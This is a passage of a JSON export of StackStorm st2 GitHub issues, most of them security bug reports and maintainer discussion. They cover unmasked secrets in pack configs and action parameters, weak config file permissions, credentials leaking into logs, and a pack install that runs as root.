public channel with the result being sent to that public channel.\r\n\r\n",
                "comments": [
                    {
                        "body": "Interesting! I like it. It's orthogonal to ChatOps RBAC, since that deals more with the (eventual) result of the execution instead of the user who is requesting the execution.\r\n\r\nA few notes:\r\n* The `ack` from the alias should be always sent to the originating channel\r\n* \"It is the calling codes responsibility to interpret and apply the correct meaning of `public`, `private`, `any` in the context of the backend being used.\" The `chatops.post_result` or `chatops.post_message` actions might be able to handle this, so workflow authors don't need to concern themselves with responding to the \"correct\" channel.\r\n\r\nI would be interested in a PR implementing this.",
                        "user": "blag",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2019-02-20T19:06:10Z",
                        "url": "https://github.com/StackStorm/st2/issues/4559#issuecomment-465712392"
                    },
                    {
                        "body": "Great! I'm glad you think this is a worth while proposal.  Regarding the notes:\r\n\r\n- Agreed, the `ack` will always be sent to the originating the channel.\r\n- I'm not sure `chatops.post_result` or `chatops.post_message` would be the right place to handle the meaning of public/private/any.  The issue I see is these actions have no real concept of the chat backend implementations:\r\n\r\ne.g.\r\nIs Slack id `D11LRK2LF` a user or a room?\r\nHow does the action know it's a Slack Id?\r\nHow should an action classify `room1@conference.localhost` XMPP, email, another backend?\r\nThere may even be backends that don't support the notion of private/public.\r\n\r\nI think if the bot (the calling code) can access the action-alias definition, it will be able to enforce the notion of privacy with more certitude.\r\n\r\nI've taken a quick look at the code, I think I could produce the needed changes but would probably need a bit of assistance to make sure it is up  StackStorm standards.  Last change I wrote a change like this (the action-alias help API) it had to be largely rewritten.",
                        "user": "nzlosh",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2019-02-20T20:44:24Z",
                        "url": "https://github.com/StackStorm/st2/issues/4559#issuecomment-465746542"
                    },
                    {
                        "body": "> I've taken a quick look at the code, I think I could produce the needed changes but would probably need a bit of assistance to make sure it is up StackStorm standards. Last change I wrote a change like this (the action-alias help API) it had to be largely rewritten.\r\n\r\nYou can use GitHub's Draft PR feature, and then just push your changes early and often for our review.",
                        "user": "blag",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2019-02-20T20:57:58Z",
                        "url": "https://github.com/StackStorm/st2/issues/4559#issuecomment-465751156"
                    },
                    {
                        "body": "In a similar request (maybe piggy back off the same feature set), i'd like to be able to disable the bot from responding to private messages all together. Reasoning is that i want all actions to be logged in a common chat room, so that the entire team can see what is being done.",
                        "user": "nmaludy",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2019-03-04T14:54:53Z",
                        "url": "https://github.com/StackStorm/st2/issues/4559#issuecomment-469281123"
                    },
                    {
                        "body": "> i'd like to be able to disable the bot from responding to private messages all together\r\n\r\nMaybe this can be done through some global config options (option sets) in `/etc/st2/st2.conf`.\r\n```\r\n[chatops]\r\ndefault_privacy_accept_triggers: any\r\ndefault_privacy_send_results: any\r\nforce_privacy_accept_triggers: false\r\nforce_privacy_send_results: false\r\n```\r\nor instead of `force' maybe:\r\n```\r\nallowed_privacy_accept_triggers: any,public,private\r\nallowed_privacy_send_results: any,public,private\r\n```",
                        "user": "cognifloyd",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2019-03-04T20:37:24Z",
                        "url": "https://github.com/StackStorm/st2/issues/4559#issuecomment-469412174"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/4448",
                "title": "Nested Key marked as secret in pack config schema showing as plain text in WebGUI",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "namachieli",
                "issue_author_association": "NONE",
                "number": 4448,
                "id": 381728980,
                "state": "open",
                "project_created_at": "2018-11-16T19:24:08Z",
                "closed_at": null,
                "body": "##### SUMMARY\r\nSeen in the zabbix pack. A nested key in the zabbix pack config that is marked as `secret: true` is still being shown in plain text in the webgui.\r\n\r\n##### ISSUE TYPE\r\n - Bug Report\r\n\r\n##### STACKSTORM VERSION\r\nPaste the output of `st2 --version`:\r\n`st2 2.9.1, on Python 2.7.12`\r\n\r\n##### OS / ENVIRONMENT / INSTALL METHOD\r\nUbuntu 16.04 LTS One line install\r\n\r\n##### STEPS TO REPRODUCE\r\nFresh install of st2 2.9.1 on Ubuntu 16.04 LTS\r\nInstall Zabbix pack from webgui\r\nConfigure as below\r\n\r\nConfig \r\n```\r\nzabbix:\r\n  password: R******$\r\n  url: https://zabbix*******\r\n  username: s******t\r\n```\r\n![image](https://user-images.githubusercontent.com/6240169/48642502-e0739100-e991-11e8-8370-cba351429bb1.png)\r\n\r\n\r\n\r\n##### EXPECTED RESULTS\r\nThe key `password:` should shows as `******`\r\n\r\n##### ACTUAL RESULTS\r\nThe key `password:` should shows as plain-text\r\n",
                "comments": [
                    {
                        "body": "Thanks for reporting this.\r\n\r\nThis indeed looks like a bug in https://github.com/stackstorm/st2web in scenario where we display whole config as raw JSON.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-11-19T09:05:58Z",
                        "url": "https://github.com/StackStorm/st2/issues/4448#issuecomment-439819544"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/4235",
                "title": "Secret object parameters in the CLI and Web are no longer redacted",
                "labels": [
                    "bug",
                    "regression",
                    "security"
                ],
                "user": "jjm",
                "issue_author_association": "MEMBER",
                "number": 4235,
                "id": 339856310,
                "state": "closed",
                "project_created_at": "2018-07-10T14:01:03Z",
                "closed_at": "2018-07-11T11:53:46Z",
                "body": "##### SUMMARY\r\n\r\nFollowing an upgrade to ST2 2.8.0, I found parameters with an type of `object` and marked as `secret: true` were not being redacted for both the WebUI and CLI.  \r\n\r\n##### ISSUE TYPE\r\n - Bug Report\r\n\r\n##### STACKSTORM VERSION\r\n```\r\nst2 2.8.0, on Python 2.7.6\r\n```\r\n\r\n##### OS / ENVIRONMENT / INSTALL METHOD\r\ndocker via st2-docker.\r\n\r\n##### STEPS TO REPRODUCE\r\nHave an action (e.g. `aws_boto3.boto3action`) that takes an object as a parameter and marked as `secret: true`.\r\n\r\nWhen running the action with the following parameters :\r\n\r\n<!--- Paste example actions and workflows between quotes below -->\r\n```yaml\r\nparameters:\r\n  region:\r\n    type: \"string\"\r\n    description: \"Region where action is performed\"\r\n    default: \"eu-west-1\"\r\n  credentials:\r\n    type: \"object\"\r\n    description: \"An AWS credentials object\"\r\n    secret: true\r\n```\r\n\r\n##### EXPECTED RESULTS\r\nThe secret parameter should be redacted, the following output is from `v2.7.x`:\r\n\r\n```yaml\r\nparameters:\r\n  credentials: '********'\r\n  region: eu-west-1\r\n```\r\n\r\n##### ACTUAL RESULTS\r\n\r\n```yaml\r\nid: 5b44b87390be8400f0b121b7\r\nstatus: succeeded\r\nparameters:\r\n  credentials:\r\n    Credentials:\r\n      AccessKeyId: <deleted-non-redacted-key>\r\n      Expiration: '2018-07-10 14:42:52'\r\n      SecretAccessKey: <deleted-non-redacted-key>\r\n      SessionToken: deleted-non-redacted-key\r\n  region: eu-west-1\r\nresult:\r\n  exit_code: 0\r\n  result:\r\n    allocation_ids: []\r\n    no_association_ids: []\r\n  stderr: ''\r\n  stdout: ''\r\n```\r\n",
                "comments": [
                    {
                        "body": "A little testing and the following simpler action configuration:\r\n\r\n```yaml\r\n  credentials:\r\n    type: \"object\"\r\n    description: \"Response from assume role\"\r\n    properties:\r\n      AccessKeyId:\r\n       type: string\r\n       secret: true\r\n      Expiration:\r\n       type: string\r\n      SecretAccessKey:\r\n       type: string\r\n       secret: true\r\n      SessionToken:\r\n       type: string\r\n       secret: true\r\n```\r\n\r\nProduces the following output as expected:\r\n\r\n```\r\nid: 5b44c1ac90be8400f0b121c3\r\nstatus: failed\r\nparameters:\r\n  credentials:\r\n    AccessKeyId: '********'\r\n    Expiration: '2018-07-10 14:42:52'\r\n    SecretAccessKey: '********'\r\n    SessionToken: '********'\r\n  region: eu-west-1\r\n```\r\n\r\nPlus the following configuration:\r\n\r\n```yaml\r\n  credentials:\r\n    type: \"object\"\r\n    description: \"Response from assume role\"\r\n    properties:\r\n      Credentials:\r\n        type: \"object\"\r\n        properties:\r\n          AccessKeyId:\r\n            type: string\r\n            secret: true\r\n          Expiration:\r\n            type: string\r\n          SecretAccessKey:\r\n            type: string\r\n            secret: true\r\n          SessionToken:\r\n            type: string\r\n            secret: true\r\n```\r\n\r\nProduces what I would have expected:\r\n\r\n```yaml\r\nd: 5b44c3b290be8400f0b121cc\r\nstatus: succeeded\r\nparameters:\r\n  credentials:\r\n    Credentials:\r\n      AccessKeyId: '********'\r\n      Expiration: '2018-07-10 14:42:52'\r\n      SecretAccessKey: '********'\r\n      SessionToken: '********'\r\n  region: eu-west-1\r\n```\r\n",
                        "user": "jjm",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-07-10T14:36:17Z",
                        "url": "https://github.com/StackStorm/st2/issues/4235#issuecomment-403845678"
                    },
                    {
                        "body": "Fixed by https://github.com/StackStorm/st2/pull/4236",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-07-11T11:53:46Z",
                        "url": "https://github.com/StackStorm/st2/issues/4235#issuecomment-404142362"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/4144",
                "title": "Weak .st2 config file permissions allow reading st2 creds by other Linux users",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "arm4b",
                "issue_author_association": "MEMBER",
                "number": 4144,
                "id": 326162788,
                "state": "closed",
                "project_created_at": "2018-05-24T15:01:02Z",
                "closed_at": "2018-06-27T22:47:15Z",
                "body": "`st2 login -w` creates `~/.st2/config` file with `r-o` permissions, meaning that unauthorized linux user can read that file and obtain st2 login credentials:\r\n```\r\n$ rm -rf ~/.st2\r\n$ st2 login st2admin -p Ch@ngeMe -w\r\n\r\n$ ls -la ~/.st2\r\ntotal 16\r\ndrwxrwxr-x 2 vagrant vagrant 4096 May 24 14:59 .\r\ndrwxr-xr-x 8 vagrant vagrant 4096 May 24 14:59 ..\r\n-rw-rw-r-- 1 vagrant vagrant   55 May 24 14:59 config\r\n-rw------- 1 vagrant vagrant   77 May 24 14:59 token-st2admin\r\n```\r\n\r\nAdditionally, `~/.st2/` dir permissions when created might be adjusted (currently `0755`).\r\nAdding setgid for st2 config dir will help to better handle `sudo st2` cases when config or token file is created with `root` permissions (see https://github.com/StackStorm/packer-st2/issues/38 for example).\r\n\r\n\r\n### Wrap Up\r\n- `~/.st2/` dir when created by st2 should have `2770` permissions (currently `0755`)\r\n- `~/.st2/config` when created by st2 should have `660` permissions (currently `664`)\r\n- `~/.st2/token` when created by st2 should have `660` permissions (currently `640`)\r\n\r\n\r\n### Related\r\nhttps://github.com/StackStorm/st2-packages/issues/558 and https://github.com/StackStorm/packer-st2/issues/38",
                "comments": [
                    {
                        "body": "Any changes needed on the ansible-st2 or puppet-st2 side?",
                        "user": "nmaludy",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-05-24T15:25:40Z",
                        "url": "https://github.com/StackStorm/st2/issues/4144#issuecomment-391756066"
                    },
                    {
                        "body": "No, correct permissions should be initially enforced by `st2` core (in fact st2client), since `st2 login` is responsible for st2 config creation (including `~/.st2/` dir).\r\n",
                        "user": "arm4b",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-05-24T15:30:45Z",
                        "url": "https://github.com/StackStorm/st2/issues/4144#issuecomment-391757932"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/4139",
                "title": "Secret values on object in an array are not masked inside a pack config.",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "NikosVlagoidis",
                "issue_author_association": "CONTRIBUTOR",
                "number": 4139,
                "id": 325316017,
                "state": "closed",
                "project_created_at": "2018-05-22T14:19:22Z",
                "closed_at": "2018-09-29T22:25:18Z",
                "body": "<!---\r\nPlease complete as much of this form as possible. It's OK if you\r\ndon't know all the answers, but fill in as much as you can. This will help\r\nus to help you. -->\r\n\r\n##### ISSUE TYPE\r\n<!--- Pick one below and delete the rest -->\r\n - Bug Report \r\n\r\n<!--- Is this actually a question? In that case, post it at forum.stackstorm.com. That's a great place\r\nto interact with users and developers, and discuss ideas. -->\r\n\r\n##### STACKSTORM VERSION\r\n<!--- Paste, BELOW THIS COMMENT, verbatim output from \"st2 --version\" between quotes below -->\r\n```\r\nst2 2.8dev (0f1d9dc), on Python 2.7.6\r\n```\r\n\r\n##### OS / ENVIRONMENT / INSTALL METHOD\r\n<!--- Below this comment, post what OS you are running this on, along with \r\nany other relevant information - e.g. Docker, Vagrant, Kubernetes, etc.\r\nDescribe how you installed ST2 - e.g. one-line install, custom install, etc -->\r\ndocker instalation\r\n\r\n\r\n##### SUMMARY\r\n<!--- Explain the problem or request briefly -->\r\n\r\nWhen I mark a secret value on a pack config inside an array I get the values in plain text even if Ii don't make the request with parameter show_secret=true.\r\n\r\n##### STEPS TO REPRODUCE\r\n<!--- For bugs, show exactly how to reproduce the problem, using a minimal test-case.\r\nFor new features, show how the feature would be used. -->\r\n\r\n<!--- Paste example actions and workflows between quotes below -->\r\n\r\nPack config\r\n\r\n```yaml\r\n---\r\n  instance:\r\n    type: \"array\"\r\n    required: false\r\n    items:\r\n      type: \"object\"\r\n      properties:\r\n          alias:\r\n              description: \"an alias for this instance\"\r\n              type: \"string\"\r\n              required: true\r\n              secret: false\r\n          base_url:\r\n              description: \"Base URL for a service\"\r\n              type: \"string\"\r\n              secret: false\r\n              required: true\r\n          secret:\r\n              description: \"The api secret key\"\r\n              type: \"string\"\r\n              secret: true\r\n              required: true\r\n```\r\n\r\nwhen  I make a request on : https://{{host}}/api/v1/configs/<pack_name>\r\n\r\n```\r\n{\r\n    \"values\": {\r\n        \"instance\": [\r\n            {\r\n                \"alias\": \"alias1\",\r\n                \"secret\": \"secret\",\r\n                \"base_url\": \"10.10.10.1\"\r\n            },\r\n            {\r\n                \"alias\": \"alias2\",\r\n                \"secret\": \"secret23\",\r\n                \"base_url\": \"10.10.10.2\"\r\n            }\r\n        ]\r\n    },\r\n    \"id\": \"5afadbb2b2c724049ee7e03c\",\r\n    \"pack\": \"<pack_name>\"\r\n}\r\n```\r\n\r\n\r\n\r\n\r\n##### EXPECTED RESULTS\r\n<!--- What did you expect to happen when running the steps above? -->\r\n\r\n\r\n```\r\n{\r\n    \"values\": {\r\n        \"instance\": [\r\n            {\r\n                \"alias\": \"alias1\",\r\n                \"secret\": \"****\",\r\n                \"base_url\": \"10.10.10.1\"\r\n            },\r\n            {\r\n                \"alias\": \"alias2\",\r\n                \"secret\": \"*****\",\r\n                \"base_url\": \"10.10.10.2\"\r\n            }\r\n        ]\r\n    },\r\n    \"id\": \"5afadbb2b2c724049ee7e03c\",\r\n    \"pack\": \"<pack_name>\"\r\n}\r\n```\r\n\r\n##### ACTUAL RESULTS\r\n<!--- What happened? What output did you get? -->\r\n\r\n```\r\n{\r\n    \"values\": {\r\n        \"instance\": [\r\n            {\r\n                \"alias\": \"alias1\",\r\n                \"secret\": \"secret\",\r\n                \"base_url\": \"10.10.10.1\"\r\n            },\r\n            {\r\n                \"alias\": \"alias2\",\r\n                \"secret\": \"secret23\",\r\n                \"base_url\": \"10.10.10.2\"\r\n            }\r\n        ]\r\n    },\r\n    \"id\": \"5afadbb2b2c724049ee7e03c\",\r\n    \"pack\": \"<pack_name>\"\r\n}\r\n```\r\n\r\n\r\n",
                "comments": [
                    {
                        "body": "Probably related to https://github.com/StackStorm/st2/pull/4122\r\n\r\nWonder if the secret masking process for the CLI / API needs the same modifications?",
                        "user": "nmaludy",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-05-22T14:30:58Z",
                        "url": "https://github.com/StackStorm/st2/issues/4139#issuecomment-391012302"
                    },
                    {
                        "body": "@NikosVlagoidis Thanks for reporting this.\r\n\r\n@nmaludy Yeah, it's most likely related to that change, but not to that code directly (that code is used in places where decrypted values are expected, API follows a different code path - just retrieves object from the database and masks secrets).\r\n\r\nWe probably need to update `BaseAPI` class / `PackConfigAPI` class to correctly mask secrets for nested objects / lists.\r\n\r\nEdit: `st2common.models.db.pack.PackDB.mask_secrets` is the method which needs to be updated.\r\n\r\nThat's also a good example which shows why it's important to think about all the various edge cases for tests when adding a new feature / similar and not just for simple \"positive\" test cases :)\r\n\r\n@nmaludy Will you have time to look into it? Or want me to do it?",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-05-22T14:41:04Z",
                        "url": "https://github.com/StackStorm/st2/issues/4139#issuecomment-391015965"
                    },
                    {
                        "body": "@Kami i'm checking it out now, looks like the affected functions are `get_secret_parameters()` and `mask_secret_parameters()`  here https://github.com/StackStorm/st2/blob/master/st2common/st2common/util/secrets.py#L28-L61\r\n\r\n",
                        "user": "nmaludy",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-05-22T14:47:28Z",
                        "url": "https://github.com/StackStorm/st2/issues/4139#issuecomment-391018346"
                    },
                    {
                        "body": "@armab Thanks for assigning the \"bug\" label - I was actually thinking of doing it myself, but IIRC, since nested objects were not supported in stable versions prior to v2.8dev, it's not a bug in a stable release, just a bug in current dev version so I decided to leave it out for now.\r\n\r\nAnyway, yeah, it's still a bug even though just in a dev release so it doesn't hurt to have that label.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-05-22T15:13:02Z",
                        "url": "https://github.com/StackStorm/st2/issues/4139#issuecomment-391028311"
                    },
                    {
                        "body": "Looks like this is fixed in #4140/#4236",
                        "user": "LindsayHill",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2018-09-29T22:25:18Z",
                        "url": "https://github.com/StackStorm/st2/issues/4139#issuecomment-425679395"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/pull/3898",
                "title": "Disable bash history when sudo password is provided as a command line argument",
                "labels": [
                    "security"
                ],
                "user": "Kami",
                "issue_author_association": "MEMBER",
                "number": 3898,
                "id": 279420062,
                "state": "closed",
                "project_created_at": "2017-12-05T15:36:39Z",
                "closed_at": "2017-12-06T10:34:07Z",
                "body": "This pull request updates remote command and script runner to explicitly disable bash history when user provides `sudo_password` parameter which is passed to `sudo` binary as a command line (stdin) argument.\r\n\r\nAs mentioned here (https://github.com/StackStorm/st2/pull/3867#issuecomment-349273078), the way paramiko executes shell commands bash history is not enabled, but it's still better to be on the safe side and also try to explicitly disable it ourselves.\r\n\r\nDisabling is done by setting `HISTFILE` (I set it to `/dev/null`, if this would become problematic in some installations where user doesn't have write access to `/dev/null` we can change that approach to try unseting this variable instead) and `HISTSIZE` environment variable and by explicitly calling `set +o history` command before any other commands which are executed as part of a paramiko session.\r\n\r\nEven though we disable bash history, there are other ways in which user with the access to the box could intercept this password so that's just additional layer and actual limitation / potential security implications of supplying `sudo_password` parameter are documented in the docs.",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/StackStorm/st2/pulls/3898",
                    "merged_at": "2017-12-06T10:34:07Z"
                }
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/3797",
                "title": "[security] MongoDB's credentials are exposed in the logs if using url-style host to connect to a replica set",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "emptywee",
                "issue_author_association": "CONTRIBUTOR",
                "number": 3797,
                "id": 266970724,
                "state": "closed",
                "project_created_at": "2017-10-19T20:03:45Z",
                "closed_at": "2017-10-23T07:43:20Z",
                "body": "Please, add a condition to verify if `db_host` has `://` in it, then show the line without the password, if any.\r\n\r\nhttps://github.com/StackStorm/st2/blob/master/st2common/st2common/models/db/__init__.py#L79\r\n\r\nThanks!",
                "comments": [
                    {
                        "body": "Thanks for reporting this - we will have a look. In the mean time, you can use \"supply password as a separate argument\" (default value) as a work-around (if that works for your use-case).\r\n\r\nEdit: Just saw you are using replica set, so supplying password as argument won't work.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-10-19T20:31:13Z",
                        "url": "https://github.com/StackStorm/st2/issues/3797#issuecomment-338029014"
                    },
                    {
                        "body": "@Kami I am not the best python developer and haven't really debugged the code, but I am not sure if it's going to honor a separately provided password variable:\r\n\r\nhttps://github.com/MongoEngine/mongoengine/blob/master/mongoengine/connection.py#L88\r\n\r\nCan you confirm?",
                        "user": "emptywee",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-10-19T20:35:44Z",
                        "url": "https://github.com/StackStorm/st2/issues/3797#issuecomment-338030185"
                    },
                    {
                        "body": "Oh I think it will. It iterates to find them in the provided url string, and overwrites if it finds one.",
                        "user": "emptywee",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-10-19T20:36:46Z",
                        "url": "https://github.com/StackStorm/st2/issues/3797#issuecomment-338030424"
                    },
                    {
                        "body": "Yes, removing username and password from the URL helps. Anyway, might be a good idea to hide it if user decided to use a one-line url as a db_host. Or at least document it somewhere.",
                        "user": "emptywee",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-10-19T21:02:41Z",
                        "url": "https://github.com/StackStorm/st2/issues/3797#issuecomment-338037116"
                    },
                    {
                        "body": "> Anyway, might be a good idea to hide it if user decided to use a one-line url as a db_host. Or at least document it somewhere.\r\n\r\nYeah, agreed, will push that change, but separate parameter is still preferred because same thing with logging could also happens in other places which we can't directly control.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-10-20T07:48:11Z",
                        "url": "https://github.com/StackStorm/st2/issues/3797#issuecomment-338132321"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/3571",
                "title": "Add \"decrypt\" param to native st2kv function, deprecate \"decrypt_kv\" filter",
                "labels": [
                    "enhancement",
                    "documentation",
                    "complexity:medium",
                    "security"
                ],
                "user": "Mierdin",
                "issue_author_association": "MEMBER",
                "number": 3571,
                "id": 243202358,
                "state": "open",
                "project_created_at": "2017-07-15T21:43:45Z",
                "closed_at": null,
                "body": "https://github.com/StackStorm/st2mistral/pull/30 modified the way that ``st2kv`` worked for encrypted values - it no longer decrypts by default, and users must explicitly ask for this via the ``decrypt`` parameter for that function. Because ``st2kv`` (within the context of mistral) natively offers decryption, the ``decrypt_kv`` filter that currently exists natively in StackStorm was not needed, and therefore not included in the filters copied over to Mistral.\r\n\r\nHowever, we now have a bit of a functionality mismatch between Mistral workflows and the usage of `st2kv` elsewhere in StackStorm, such as in ActionChain workflows.\r\n\r\nSo, we should do a few things:\r\n\r\n- Add the ability to provide the same `decrypt` parameter to the st2-native `st2kv` function. The function does not currently decrypt by default, so that part is consistent with mistral's `st2kv`, but it should be something the user can specify in params if they want decryption to take place. This is just a parameter addition, so this shouldn't be a breaking change.\r\n- If the previous change is made, `decrypt_kv` filter is no longer needed and should be deprecated. Care should be taken to ensure that the surrounding work in https://github.com/StackStorm/st2/pull/2939 is not undone - only the removal of the unneeded filter.\r\n- Update documentation, letting users know of the new parameter to `st2kv` as well as the deprecation of `decrypt_kv`.\r\n- Update examples in `examples` pack with new usages\r\n- Add/update integration or unit tests as needed",
                "comments": [],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/3366",
                "title": "API key can be created for a nonexistent user",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "m4dcoder",
                "issue_author_association": "CONTRIBUTOR",
                "number": 3366,
                "id": 222860153,
                "state": "open",
                "project_created_at": "2017-04-19T20:22:44Z",
                "closed_at": null,
                "body": "An API key can be created for a user that doesn't exists (i.e. `st2 apikey create -u foobar` where foobar is a nonexistent user). The API key created for this nonexistent user `foobar` can be used to execute an action and the execution is listed under `foobar` in context.user. The API key should not have been created in the first place if the user does not exist. Also, since API key doesn't have expiration, there should be another validation during runtime to make sure the user still exists before the API key is verified for other StackStorm operations.",
                "comments": [
                    {
                        "body": "My response from Slack:\r\n\r\n> m4dcoder yeah ask manas about the reasoning, i dont remember anymore\r\n> aka why we do / support that :stuck_out_tongue:\r\n> that also explains what kind of comments are useful - why not what :smile:\r\n> code comments that is\r\n> and to clarify it's not unexistent user when creating api key if corresponding user object doesnt exist it's created\r\n> i was wondering the same thing the other day when working on that code - why we do it\r\n> but i didnt see any negative security impacts from it so i just ignored it for the time beging\r\n\r\nIn short, it would be first good to figure out why it's done the way it's currently done.\r\n\r\nLike I said on Slack, I didn't see any negative security implications or similar from that behavior while looking at it a couple of days ago (please correct me if I missed something), but if we don't come up with a particular reason / use-case why it was done that way, I'm also fine with changing the behavior (throwing is specified user doesn't exist) - in fact, that's how I would do it if I was implementing it, but it seems like this was probably deliberate decision for some, right now, unknown reason to us.",
                        "user": "Kami",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-04-19T21:10:07Z",
                        "url": "https://github.com/StackStorm/st2/issues/3366#issuecomment-295444265"
                    },
                    {
                        "body": "This is a problem when you are creating an entry in the datastore, if the API-KEY of the specific user is not created, then the scope won't work when when you use {{st2kv.user...}} in any config file, making it impossible for multi-tenancy (e,g multiple credentials).\r\n\r\nIn order for this to work user and API key users must be created.",
                        "user": "faustolendeborg",
                        "issue_author_association": "NONE",
                        "project_created_at": "2017-05-27T23:19:39Z",
                        "url": "https://github.com/StackStorm/st2/issues/3366#issuecomment-304481710"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/StackStorm/st2/issues/3298",
                "title": "Pack Install Doesn't Honor System user, running as root",
                "labels": [
                    "bug",
                    "security"
                ],
                "user": "bigmstone",
                "issue_author_association": "CONTRIBUTOR",
                "number": 3298,
                "id": 215943672,
                "state": "open",
                "project_created_at": "2017-03-22T03:37:16Z",
                "closed_at": null,
                "body": "If you attempt to perform a pack install from a git repo it uses root ssh keys.\r\n\r\nFrom docs:\r\n>For SSH (URLs starting with git@) auth you have to create a deploy key, and require the system user running the command (stanley or root, depending on your configuration) to have a private key. Deploy keys are more secure than personal access tokens and can be configured on the per-repo basis.\r\n\r\nHowever since we clone from python action and python action is shelled out as `root` and not `system user` this action will always use the root keys.",
                "comments": [
                    {
                        "body": "Noticed some strange behavior today that made me add the `to be verified` tag. On scripted install I'm seeing it operate under `stanley` user but using `id_rsa` instead of `stanley_rsa`. So this might be different than originally reported as well as cause for opening up a bug on StackStorm/ansible-st2",
                        "user": "bigmstone",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-03-23T00:12:29Z",
                        "url": "https://github.com/StackStorm/st2/issues/3298#issuecomment-288578450"
                    },
                    {
                        "body": "I ran into this today attempting to install a pack from a private github repo. I'm posting the below in case it helps to verify/provide more detail about the issue. \r\n\r\nThe following snippet from the output when it failed indicates that it's attempting to clone it as root:\r\n\r\n```\r\nCloning into '/root/20b4efc01c6c82ffb96ad617f56f1ddf'...\r\nHost key verification failed.\r\nfatal: Could not read from remote repository.\r\nPlease make sure you have the correct access rights and the repository exists.\r\n```\r\n\r\nLooking at the traceback:\r\n```\r\nTraceback (most recent call last):\r\n  File \\\"/opt/stackstorm/st2/local/lib/python2.7/site-packages/st2common/runners/python_action_wrapper.py\\\", line 259, in <module>\r\n    obj.run()\r\n  File \\\"/opt/stackstorm/st2/local/lib/python2.7/site-packages/st2common/runners/python_action_wrapper.py\\\", line 155, in run\r\n    output = action.run(**self._parameters)\r\n  File \\\"/opt/stackstorm/packs/packs/actions/pack_mgmt/download.py\\\", line 75, in run\r\n    verifyssl=verifyssl, ref=pack_version)\r\n  File \\\"/opt/stackstorm/packs/packs/actions/pack_mgmt/download.py\\\", line 102, in _clone_repo\r\n    repo = Repo.clone_from(repo_url, temp_dir)\r\n  File \\\"/opt/stackstorm/st2/lib/python2.7/site-packages/git/repo/base.py\\\", line 942, in clone_from\r\n    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, **kwargs)\r\n  File \\\"/opt/stackstorm/st2/lib/python2.7/site-packages/git/repo/base.py\\\", line 897, in _clone\r\n    finalize_process(proc, stderr=stderr)\r\n  File \\\"/opt/stackstorm/st2/lib/python2.7/site-packages/git/util.py\\\", line 341, in finalize_process\r\n    proc.wait(**kwargs)\r\n  File \\\"/opt/stackstorm/st2/lib/python2.7/site-packages/git/cmd.py\\\", line 292, in wait\r\n    raise GitCommandError(self.args, status, errstr)\r\ngit.exc.GitCommandError: Cmd('git') failed due to: exit code(128)\r\n  cmdline: git clone -v git@github.com:notTheReal/repo.git /root/20b4efc01c6c82ffb96ad617f56f1ddf\r\n```\r\n\r\nThe following lines from /opt/stackstorm/packs/packs/actions/pack_mgmt/download.py seem to show why this is happening -- it's not attempting to run as the system user, it's running as whatever user is used to run the python script:\r\n\r\n```\r\n 71                 try:\r\n 72                     user_home = os.path.expanduser('~')\r\n 73                     abs_local_path = os.path.join(user_home, temp_dir_name)\r\n 74                     self._clone_repo(temp_dir=abs_local_path, repo_url=pack_url,\r\n 75                                      verifyssl=verifyssl, ref=pack_version)\r\n```\r\n\r\nSorry, I don't know how /opt/stackstorm/packs/packs/actions/pack_mgmt/download.py maps to code in the repo(s) - I used the curl command from https://docs.stackstorm.com/install/index.html to install stackstorm.\r\n\r\nHope this helps.",
                        "user": "bradym",
                        "issue_author_association": "NONE",
                        "project_created_at": "2017-06-23T00:32:56Z",
                        "url": "https://github.com/StackStorm/st2/issues/3298#issuecomment-310538474"
                    },
                    {
